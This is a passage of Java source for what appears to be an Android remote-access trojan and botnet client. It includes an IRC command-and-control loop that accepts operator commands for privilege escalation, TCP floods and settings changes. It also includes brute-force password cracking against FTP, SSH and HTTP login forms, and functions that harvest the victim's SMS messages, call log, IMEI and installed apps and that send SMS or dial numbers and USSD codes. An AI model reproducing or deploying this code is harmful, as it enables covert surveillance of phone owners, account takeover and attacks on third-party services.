                                            Collections.addAll(passwords, EntityUtils.toString(responseEntity).split("\\r?\\n"));
                                        }
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        log_all("CO function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                    }
                                }
                                if (passwords.size() == 0) {
                                    c.getOutputStream().write(SB("You can't crack a service with no passwords!"));
                                } else {
                                    if (!CUH(h, p)) {
                                        c.getOutputStream().write(SB("[!] - Host/IP is not up (" + h + ")."));
                                    } else {
                                        c.getOutputStream().write(SB("Starting the crack....\n"));
                                        for (String cp : passwords.toArray(new String[passwords.size()])) {
                                            if (FTPLogin(h, p, u, cp)) {
                                                c.getOutputStream().write(SB("Password cracked successfully.\nUser: " + u + "\nPass: " + cp));
                                                return;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        break;
                    case "ssh":
                        c.getOutputStream().write(SB("Host of the service: "));
                        h = br.readLine();
                        if (h.equals("")) {
                            c.getOutputStream().write(SB("You can't crack a service on no host!"));
                        } else {
                            c.getOutputStream().write(SB("Port of the service (If default is empty, CO function will take care of it) [Default: 22]: "));
                            p = br.readLine();
                            if (p.equals("")) p = "22";
                            c.getOutputStream().write(SB("User to crack: "));
                            u = br.readLine();
                            if (u.equals("")) {
                                c.getOutputStream().write(SB("You can't crack a service with no user!"));
                            } else {
                                c.getOutputStream().write(SB("Next step requires attention! You'll write either passwords (one per line) or a URL linking a password list.\n"));
                                c.getOutputStream().write(SB("Please choose a method of inputting passwords (Password per line/URL) [Default: Password per line]: "));
                                String mthd = br.readLine();
                                ArrayList<String> passwords = new ArrayList<>();
                                if ((mthd.equals("")) || (mthd.toLowerCase().equals("password per line"))) {
                                    c.getOutputStream().write(SB("Write as many passwords as you wish, but be aware of the victim's RAM and CPU! (Write an empty line to end the passwords input method)\n"));
                                    String pass = br.readLine();
                                    while (!pass.equals("")) {
                                        passwords.add(pass);
                                        pass = br.readLine();
                                    }
                                } else if (mthd.toLowerCase().equals("url")) {
                                    c.getOutputStream().write(SB("Write the URL which links the password list: "));
                                    String url = br.readLine();
                                    try {
                                        HttpClient httpClient = new DefaultHttpClient();
                                        HttpGet httpGet = new HttpGet(url);
                                        HttpResponse httpResponse;
                                        httpResponse = httpClient.execute(httpGet);
                                        if (httpResponse == null) {
                                            return;
                                        }
                                        HttpEntity responseEntity = httpResponse.getEntity();
                                        if (responseEntity != null) {
                                            Collections.addAll(passwords, EntityUtils.toString(responseEntity).split("\\r?\\n"));
                                        }
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        log_all("CO function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                    }
                                }
                                if (passwords.size() == 0) {
                                    c.getOutputStream().write(SB("You can't crack a service with no passwords!"));
                                } else {
                                    if (!CUH(h, p)) {
                                        c.getOutputStream().write(SB("[!] - Host/IP is not up (" + h + ")."));
                                    } else {
                                        c.getOutputStream().write(SB("Starting the crack....\n"));
                                        for (String cp : passwords.toArray(new String[passwords.size()])) {
                                            if (SSHLogin(h, p, u, cp)) {
                                                c.getOutputStream().write(SB("Password cracked successfully.\nUser: " + u + "\nPass: " + cp));
                                                return;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        break;
                    case "http_get":
                        c.getOutputStream().write(SB("This will be Hydra HTTP-Form attack, so be a Hydra user.\n"));
                        c.getOutputStream().write(SB("Host of the service (Without `http(s)`): "));
                        h = br.readLine();
                        if (h.equals("")) {
                            c.getOutputStream().write(SB("You can't crack a service on no host!"));
                        } else {
                            c.getOutputStream().write(SB("Port of the service (If default is empty, CO function will take care of it) [Default: 80]: "));
                            p = br.readLine();
                            boolean ssl = false;
                            if (p.equals("")) p = "80";
                            if (p.equals("443")) ssl = true;
                            if ((!p.equals("80")) && (!p.equals("443"))) {
                                c.getOutputStream().write(SB("Non-default port! SSL? (Y/N) [Default: N]: "));
                                String sslchoice = br.readLine();
                                ssl = !((sslchoice.equals("")) || (sslchoice.toLowerCase().equals("n")));
                            }
                            c.getOutputStream().write(SB("URL to crack on (Hydra format: \"/PATH/:username=^USER^&password=^PASS^:Login failed\"): "));
                            String url2crack = br.readLine();
                            if (url2crack.equals("")) {
                                c.getOutputStream().write(SB("You can't crack this service with no URL!"));
                                return;
                            }
                            c.getOutputStream().write(SB("Notice that the above URL will look like this: " + h + url2crack.split(":")[0] + "?" + url2crack.split(":")[1] + "\n"));
                            c.getOutputStream().write(SB("User to crack: "));
                            u = br.readLine();
                            if (u.equals("")) {
                                c.getOutputStream().write(SB("You can't crack a service with no user!"));
                            } else {
                                c.getOutputStream().write(SB("Next step requires attention! You'll write either passwords (one per line) or a URL linking a password list.\n"));
                                c.getOutputStream().write(SB("Please choose a method of inputting passwords (Password per line/URL) [Default: Password per line]: "));
                                String mthd = br.readLine();
                                ArrayList<String> passwords = new ArrayList<>();
                                if ((mthd.equals("")) || (mthd.toLowerCase().equals("password per line"))) {
                                    c.getOutputStream().write(SB("Write as many passwords as you wish, but be aware of the victim's RAM and CPU! (Write an empty line to end the passwords input method)\n"));
                                    String pass = br.readLine();
                                    while (!pass.equals("")) {
                                        passwords.add(pass);
                                        pass = br.readLine();
                                    }
                                } else if (mthd.toLowerCase().equals("url")) {
                                    c.getOutputStream().write(SB("Write the URL which links the password list: "));
                                    String url = br.readLine();
                                    try {
                                        HttpClient httpClient = new DefaultHttpClient();
                                        HttpGet httpGet = new HttpGet(url);
                                        HttpResponse httpResponse;
                                        httpResponse = httpClient.execute(httpGet);
                                        if (httpResponse == null) {
                                            return;
                                        }
                                        HttpEntity responseEntity = httpResponse.getEntity();
                                        if (responseEntity != null) {
                                            Collections.addAll(passwords, EntityUtils.toString(responseEntity).split("\\r?\\n"));
                                        }
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        log_all("CO function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                    }
                                }
                                if (passwords.size() == 0) {
                                    c.getOutputStream().write(SB("You can't crack a service with no passwords!"));
                                } else {
                                    if (!CUH(h, p)) {
                                        c.getOutputStream().write(SB("[!] - Host/IP is not up (" + h + ")."));
                                    } else {
                                        c.getOutputStream().write(SB("Starting the crack....\n"));
                                        for (String cp : passwords.toArray(new String[passwords.size()])) {
                                            if (HydraHttp(h, p, url2crack, u, cp, false, ssl)) {
                                                c.getOutputStream().write(SB("Password cracked successfully.\nUser: " + u + "\nPass: " + cp));
                                                return;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        break;
                    case "http_post":
                        c.getOutputStream().write(SB("This will be Hydra HTTP-Form attack, so be a Hydra user.\n"));
                        c.getOutputStream().write(SB("Host of the service (Without `http(s)`): "));
                        h = br.readLine();
                        if (h.equals("")) {
                            c.getOutputStream().write(SB("You can't crack a service on no host!"));
                        } else {
                            c.getOutputStream().write(SB("Port of the service (If default is empty, CO function will take care of it) [Default: 80]: "));
                            p = br.readLine();
                            boolean ssl = false;
                            if (p.equals("")) p = "80";
                            if (p.equals("443")) ssl = true;
                            if ((!p.equals("80")) && (!p.equals("443"))) {
                                c.getOutputStream().write(SB("Non-default port! SSL? (Y/N) [Default: N]: "));
                                String sslchoice = br.readLine();
                                ssl = !((sslchoice.equals("")) || (sslchoice.toLowerCase().equals("n")));
                            }
                            c.getOutputStream().write(SB("URL to crack on (Hydra format: \"/PATH/:username=^USER^&password=^PASS^:Login failed\"): "));
                            String url2crack = br.readLine();
                            if (url2crack.equals("")) {
                                c.getOutputStream().write(SB("You can't crack this service with no URL!"));
                                return;
                            }
                            c.getOutputStream().write(SB("Notice that the above URL will look like this: " + h + url2crack.split(":")[0] + "\nAnd the post data is ==> " + url2crack.split(":")[1] + "\n"));
                            c.getOutputStream().write(SB("User to crack: "));
                            u = br.readLine();
                            if (u.equals("")) {
                                c.getOutputStream().write(SB("You can't crack a service with no user!"));
                            } else {
                                c.getOutputStream().write(SB("Next step requires attention! You'll write either passwords (one per line) or a URL linking a password list.\n"));
                                c.getOutputStream().write(SB("Please choose a method of inputting passwords (Password per line/URL) [Default: Password per line]: "));
                                String mthd = br.readLine();
                                ArrayList<String> passwords = new ArrayList<>();
                                if ((mthd.equals("")) || (mthd.toLowerCase().equals("password per line"))) {
                                    c.getOutputStream().write(SB("Write as many passwords as you wish, but be aware of the victim's RAM and CPU! (Write an empty line to end the passwords input method)\n"));
                                    String pass = br.readLine();
                                    while (!pass.equals("")) {
                                        passwords.add(pass);
                                        pass = br.readLine();
                                    }
                                } else if (mthd.toLowerCase().equals("url")) {
                                    c.getOutputStream().write(SB("Write the URL which links the password list: "));
                                    String url = br.readLine();
                                    try {
                                        HttpClient httpClient = new DefaultHttpClient();
                                        HttpGet httpGet = new HttpGet(url);
                                        HttpResponse httpResponse;
                                        httpResponse = httpClient.execute(httpGet);
                                        if (httpResponse == null) {
                                            return;
                                        }
                                        HttpEntity responseEntity = httpResponse.getEntity();
                                        if (responseEntity != null) {
                                            Collections.addAll(passwords, EntityUtils.toString(responseEntity).split("\\r?\\n"));
                                        }
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                        log_all("CO function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                                    }
                                }
                                if (passwords.size() == 0) {
                                    c.getOutputStream().write(SB("You can't crack a service with no passwords!"));
                                } else {
                                    if (!CUH(h, p)) {
                                        c.getOutputStream().write(SB("[!] - Host/IP is not up (" + h + ")."));
                                    } else {
                                        c.getOutputStream().write(SB("Starting the crack....\n"));
                                        for (String cp : passwords.toArray(new String[passwords.size()])) {
                                            if (HydraHttp(h, p, url2crack, u, cp, true, ssl)) {
                                                c.getOutputStream().write(SB("Password cracked successfully.\nUser: " + u + "\nPass: " + cp));
                                                return;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        break;
                    default:
                        c.getOutputStream().write(SB("Unknown or unsupported service (" + cs + ")!"));
                        break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            log_all("CO function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
    }
    private class IRC implements Runnable {
        @Override
        public void run() {
            while (true) {
                try {
                    BufferedReader br;
                    DataOutputStream o;
                    if (IRCSSL) {
                        SSLSocket c = (SSLSocket) SSLSocketFactory.getDefault().createSocket(IRCS, IRCP);
                        o = new DataOutputStream(c.getOutputStream());
                        br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                    } else {
                        Socket c = new Socket(IRCS, IRCP);
                        o = new DataOutputStream(c.getOutputStream());
                        br = new BufferedReader(new InputStreamReader(c.getInputStream()));
                    }
                    o.writeBytes("USER " + botid + " * * APS-" + botid + "\n");
                    o.writeBytes("NICK APS-" + botid + "\n");
                    o.writeBytes("JOIN " + IRCCH + "\n");
                    o.writeBytes("PRIVMSG " + IRCM + " :I'm up.\n");
                    o.writeBytes("PRIVMSG " + IRCB + " :I'm up.\n");
                    while (true) {
                        try {
                            String l = br.readLine();
                            if ((!l.equals("")) && (l.contains(" "))) {
                                if (l.toLowerCase().startsWith("ping ")) {
                                    o.writeBytes("PONG " + l.split(" ")[1] + "\n");
                                } else if (l.toLowerCase().split(" ")[1].equals("join")) {
                                    if (l.toLowerCase().split(" ")[2].equals(IRCCH.toLowerCase())) {
                                        if ((l.toLowerCase().startsWith(":" + IRCM.toLowerCase())) || (l.toLowerCase().startsWith(":" + IRCB.toLowerCase()))) {
                                            Thread.sleep(1000);
                                            o.writeBytes("PRIVMSG " + IRCCH + " :" + username + "/" + devicename + "\n");
                                            o.writeBytes("PRIVMSG " + IRCCH + " :I'm ready to take commands.\n");
                                        }
                                    }
                                } else if (l.toLowerCase().split(" ")[2].startsWith("aps-")) {
                                    if (l.split(" ").length > 4) {
                                        if (l.toLowerCase().split(" ")[4].equals(IRCCH.toLowerCase())) {
                                            for (String u : l.split(IRCCH + " :")[1].split(" ")) {
                                                if ((u.toLowerCase().endsWith(IRCM.toLowerCase())) || (u.toLowerCase().endsWith(IRCB.toLowerCase()))) {
                                                    Thread.sleep(1000);
                                                    o.writeBytes("PRIVMSG " + IRCCH + " :" + username + "/" + devicename + "\n");
                                                    o.writeBytes("PRIVMSG " + IRCCH + " :I'm ready to take commands.\n");
                                                }
                                            }
                                        }
                                    }
                                } else if (l.toLowerCase().split(" ")[1].equals("kick")) {
                                    if ((l.toLowerCase().split(" ")[2].equals(IRCCH.toLowerCase())) && (l.toLowerCase().split(" ")[3].equals("aps-" + botid.toLowerCase()))) {
                                        o.writeBytes("JOIN " + IRCCH + "\n");
                                        o.writeBytes("PRIVMSG " + IRCM + " : User (" + l.split("!")[0].substring(1) + ") kicked me out for the reason {" + l.split(":")[2] + "}\n");
                                    }
                                }
                                if (l.toLowerCase().split(" ")[1].equals("privmsg")) {
                                    if (l.toLowerCase().split(" ")[2].equals(IRCCH.toLowerCase())) {
                                        if ((l.toLowerCase().startsWith(":" + IRCM.toLowerCase())) || (l.toLowerCase().startsWith(":" + IRCB.toLowerCase()))) {
                                            String cmd = l.replaceFirst(l.split(" ")[0] + " ", "");
                                            cmd = cmd.replaceFirst(l.split(" ")[1] + " ", "");
                                            cmd = cmd.replaceFirst(l.split(" ")[2] + " :", "");
                                            if (cmd.toLowerCase().startsWith("ss ")) {
                                                SS(cmd.split(" ")[1], cmd.split(" ")[2]);
                                                LS();
                                                o.writeBytes("PRIVMSG " + IRCCH + " :Setting (" + cmd.split(" ")[1] + ") has been changed.\n");
                                            } else if (cmd.toLowerCase().equals("mmo")) {
                                                o.writeBytes("MODE " + IRCCH + " +o " + l.split("!")[0].substring(1) + "\n");
                                            } else if (cmd.toLowerCase().startsWith("kuo ")) {
                                                o.writeBytes("KICK " + IRCCH + " " + cmd.substring(4) + "\n");
                                            } else if (cmd.toLowerCase().equals("cts")) {
                                                GTM();
                                            } else if (cmd.toLowerCase().equals("wcs")) {
                                                WCS();
                                            } else if (cmd.toLowerCase().startsWith("btcp ")) {
                                                BTCP(cmd.substring(5));
                                            } else if (cmd.toLowerCase().startsWith("rtcp ")) {
                                                RTCP(cmd.split("\\|")[0].split(" ")[1], cmd.split("\\|")[1]);
                                            } else if (cmd.toLowerCase().equals("id")) {
                                                o.writeBytes("PRIVMSG " + IRCCH + " :" + username + "/" + devicename + "\n");
                                            } else if (cmd.toLowerCase().equals("ch")) {
                                                if (shell("whoami").toLowerCase().equals("root")) {
                                                    o.writeBytes("PRIVMSG " + IRCCH + " :We are higher than normal (root).\n");
                                                } else {
                                                    o.writeBytes("PRIVMSG " + IRCCH + " :We are not high :(\n");
                                                }
                                            } else if (cmd.toLowerCase().equals("canh")) {
                                                if (shell("which su").toLowerCase().equals("")) {
                                                    o.writeBytes("PRIVMSG " + IRCCH + " :We can NOT get higher!\n");
                                                } else {
                                                    o.writeBytes("PRIVMSG " + IRCCH + " :We can get higher.\n");
                                                }
                                            } else if (cmd.toLowerCase().equals("gh")) {
                                                if (gh()) {
                                                    o.writeBytes("PRIVMSG " + IRCCH + " :We did get higher.\n");
                                                } else {
                                                    o.writeBytes("PRIVMSG " + IRCCH + " :We couldn't get higher!\n");
                                                }
                                            }
                                        }
                                    } else if (botid.toLowerCase().startsWith(l.toLowerCase().split(" ")[2].substring(4))) {
                                        if ((l.toLowerCase().startsWith(":" + IRCM.toLowerCase())) || (l.toLowerCase().startsWith(":" + IRCB.toLowerCase()))) {
                                            String cmd = l.replaceFirst(l.split(" ")[0] + " ", "");
                                            cmd = cmd.replaceFirst(l.split(" ")[1] + " ", "");
                                            cmd = cmd.replaceFirst(l.split(" ")[2] + " :", "");
                                            if (cmd.toLowerCase().startsWith("ss ")) {
                                                SS(cmd.split(" ")[1], cmd.split(" ")[2]);
                                                LS();
                                                o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " :Setting (" + cmd.split(" ")[1] + ") has been changed.\n");
                                            } else if (cmd.toLowerCase().equals("mmo")) {
                                                o.writeBytes("MODE " + IRCCH + " +o " + l.split("!")[0].substring(1) + "\n");
                                            } else if (cmd.toLowerCase().startsWith("kuo ")) {
                                                o.writeBytes("KICK " + IRCCH + " " + cmd.substring(4));
                                            } else if (cmd.toLowerCase().startsWith("gs ")) {
                                                o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " : Setting (" + cmd.split(" ")[1] + ") is set to ==> " + GS(cmd.split(" ")[1]) + "\n");
                                            } else if (cmd.toLowerCase().equals("cts")) {
                                                GTM();
                                            } else if (cmd.toLowerCase().equals("wcs")) {
                                                WCS();
                                            } else if (cmd.toLowerCase().equals("rjc")) {
                                                o.writeBytes("JOIN " + IRCCH);
                                            } else if (cmd.toLowerCase().startsWith("btcp ")) {
                                                BTCP(cmd.substring(5));
                                            } else if (cmd.toLowerCase().startsWith("rtcp ")) {
                                                RTCP(cmd.split("\\|")[0].split(" ")[1], cmd.split("\\|")[1]);
                                            } else if (cmd.toLowerCase().equals("id")) {
                                                o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " :" + username + "/" + devicename + "\n");
                                            } else if (cmd.toLowerCase().equals("ch")) {
                                                if (shell("whoami").toLowerCase().equals("root")) {
                                                    o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " :We are higher than normal (root).\n");
                                                } else {
                                                    o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " :We are not high :(\n");
                                                }
                                            } else if (cmd.toLowerCase().equals("canh")) {
                                                if (shell("which su").toLowerCase().equals("")) {
                                                    o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " :We can NOT get higher!\n");
                                                } else {
                                                    o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " :We can get higher.\n");
                                                }
                                            } else if (cmd.toLowerCase().equals("gh")) {
                                                if (gh()) {
                                                    o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " :We did get higher.\n");
                                                } else {
                                                    o.writeBytes("PRIVMSG " + l.split("!")[0].substring(1) + " :We couldn't get higher!\n");
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            log_all("IRC function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    log_all("IRC function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                }
            }
        }
    }
    private void LS() {
        botid = GS("botid");
        server = GS("server");
        aps = GS("aps");
        apsshuser = GS("apsshuser");
        apsshpass = GS("apsshpass");
        botname = GS("botname");
        password = GS("password");
        wtime = Integer.parseInt(GS("wtime"));
    }
    private String IMEI() {
        TelephonyManager telephonyManager = (TelephonyManager) main_context.getSystemService(Context.TELEPHONY_SERVICE);
        return telephonyManager.getDeviceId();
    }
    private String GCL() {
        StringBuilder sb = new StringBuilder();
        try {
            if (ActivityCompat.checkSelfPermission(main_context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                RequestPermissions(new String[]{Manifest.permission.READ_CALL_LOG});
                return "Permissions denied!";
            }
            Cursor managedCursor = main_context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            while ( managedCursor.moveToNext() ) {
                sb.append("\n#################################");
                String phNumber = managedCursor.getString( number );
                String callType = managedCursor.getString( type );
                String callDate = managedCursor.getString( date );
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString( duration );
                String dir = null;
                int dircode = Integer.parseInt( callType );
                switch( dircode ) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                sb.append("\nPhone Number: ").append(phNumber).append(" \nCall Type: ").append(dir).append(" \nCall Date: ").append(callDayTime).append(" \nCall duration in sec: ").append(callDuration);
                sb.append("\n#################################\n");
            }
            managedCursor.close();
        }catch (Exception e){
            e.printStackTrace();
            log_all("GCL function: "+e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return sb.toString();
    }
    private String GML() {
        StringBuilder sb = new StringBuilder();
        try{
            Uri message = Uri.parse("content://sms/");
            Cursor c = main_context.getContentResolver().query(message, null, null, null, null);
            int totalSMS = c.getCount();
            if (c.moveToLast()) {
                for (int i = 0; i < totalSMS; i++) {
                    sb.append("\n#################################\n");
                    sb.append("SMS ID: ");
                    sb.append(c.getString(c.getColumnIndexOrThrow("_id")));
                    sb.append("\nSMS Address: ");
                    sb.append(c.getString(c.getColumnIndexOrThrow("address")));
                    sb.append("\nSMS Body: ");
                    sb.append(c.getString(c.getColumnIndexOrThrow("body")));
                    sb.append("\nSMS State: ");
                    sb.append(c.getString(c.getColumnIndex("read")).contains("0") ? "Not read" : "Read");
                    sb.append("\nSMS Date: ");
                    sb.append(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")))));
                    sb.append("\nSMS Type: ");
                    sb.append(c.getString(c.getColumnIndexOrThrow("type")).contains("1") ? "Received" : "Sent");
                    sb.append("\n#################################\n");
                    c.moveToPrevious();
                }
            }
            c.close();
        }catch (Exception e){
            e.printStackTrace();
            log_all("GML function: "+e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return sb.toString();
    }
    private String APPS(){
        String s="";
        try{
            PackageManager p = main_context.getPackageManager();
            final List<PackageInfo> appinstall = p.getInstalledPackages(PackageManager.GET_PERMISSIONS | PackageManager.GET_PROVIDERS | PackageManager.GET_ACTIVITIES);
            for(PackageInfo app: appinstall){
                s+="\n#################################\n";
                s+="\nApplication name: "+app.applicationInfo.loadLabel(p);
                s+="\nPackage name: "+app.applicationInfo.packageName;
                s+="\nData dir: "+app.applicationInfo.dataDir;
                if(app.activities!=null) s+="\nFirst activity: "+app.activities[0].name;
                s+="\nRequested permissions:";
                try{
                    if(app.requestedPermissions!=null) {
                        for (int i = 0; i < app.requestedPermissions.length; i++) {
                            try {
                                s += "\n" + app.requestedPermissions[i] + ": " + ((app.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0 ? "Granted" : "Denied");
                            } catch (Exception e) {
                                e.printStackTrace();
                                log_all("APPS function: " + e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                            }
                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    log_all("APPS function: "+e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
                }
                s+="\n#################################\n";
            }
        }catch (Exception e){
            e.printStackTrace();
            log_all("APPS function: "+e.getMessage() + "\nLine #: " + e.getStackTrace()[0].getLineNumber());
        }
        return s;
    }
    private boolean CN(String n){
        if(n==null) return false;
        if(n.matches("[^0-9#*]")) n=n.replaceAll("[^0-9#*]","");
        try{
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + n));
            if (ActivityCompat.checkSelfPermission(main_context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                RequestPermissions(new String[] {Manifest.permission.CALL_PHONE});
                return false;
            }
            main_context.startActivity(intent);
        }catch (Exception e){
            e.printStackTrace();
            log_all("CN function: "+e.getMessage()+"\nLine #: "+e.getStackTrace()[0].getLineNumber());
            return false;
        }
        return true;
    }
    private boolean USSD(String code){
        if (!CheckPermission(Manifest.permission.CALL_PHONE)) {
            RequestPermissions(new String[] {Manifest.permission.CALL_PHONE});
            return false;
        }
        if(code==null) return false;
        if(code.matches("[^0-9*#]")) return false;
        if((!code.startsWith("*"))||(!code.endsWith("#"))) return false;
        try{
            code = code.replaceAll("#",Uri.encode("#"));
            main_context.startActivity(new Intent("android.intent.action.CALL", Uri.parse("tel:" + code)));
            return true;
        }catch (Exception e){
            e.printStackTrace();
            log_all("USSD function: "+e.getMessage()+"\nLine #: "+e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
    private void SMS(Socket c){
        try{
            if(!CheckPermission(Manifest.permission.SEND_SMS)){
                RequestPermissions(new String[]{Manifest.permission.SEND_SMS});
                c.getOutputStream().write(SB("Permission denied!"));
                return;
            }
            c.getOutputStream().write(SB("Write the number to send to: "));
            String n = new BufferedReader(new InputStreamReader(c.getInputStream())).readLine();
            String s = "";
            c.getOutputStream().write(SB("Message body [Empty line ends the body]: "));
            String l = new BufferedReader(new InputStreamReader(c.getInputStream())).readLine();
            while (!l.equals("")){
                s+=l+"\n";
                l = new BufferedReader(new InputStreamReader(c.getInputStream())).readLine();
                if(l.equals("")) break;
            }
            if(s.equals("")) c.getOutputStream().write(SB("Message body was empty! Canceling...."));
            else{
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(n, null, s, null, null);
                c.getOutputStream().write(SB("Done sending."));
            }
        }catch (Exception e){
            e.printStackTrace();
            log_all("SMS function: "+e.getMessage()+"\nLine #: "+e.getStackTrace()[0].getLineNumber());
        }
    }
    private enum VolMode{U,D,M;}
    private boolean VolChange(VolMode m){
        try{
            AudioManager a = (AudioManager) main_context.getSystemService(Context.AUDIO_SERVICE);
            switch (m) {
                case U:
                    a.adjustVolume(AudioManager.ADJUST_RAISE,AudioManager.FLAG_PLAY_SOUND);
                    break;
                case D:
                    a.adjustVolume(AudioManager.ADJUST_LOWER,AudioManager.FLAG_PLAY_SOUND);
                    break;
                case M:
                    a.adjustVolume(AudioManager.ADJUST_TOGGLE_MUTE,AudioManager.FLAG_PLAY_SOUND);
                    break;
            }
            return true;
        }catch (Exception e){
            e.printStackTrace();
            log_all("VolChange function: "+e.getMessage()+"\nLine #: "+e.getStackTrace()[0].getLineNumber());
        }
        return false;
    }
}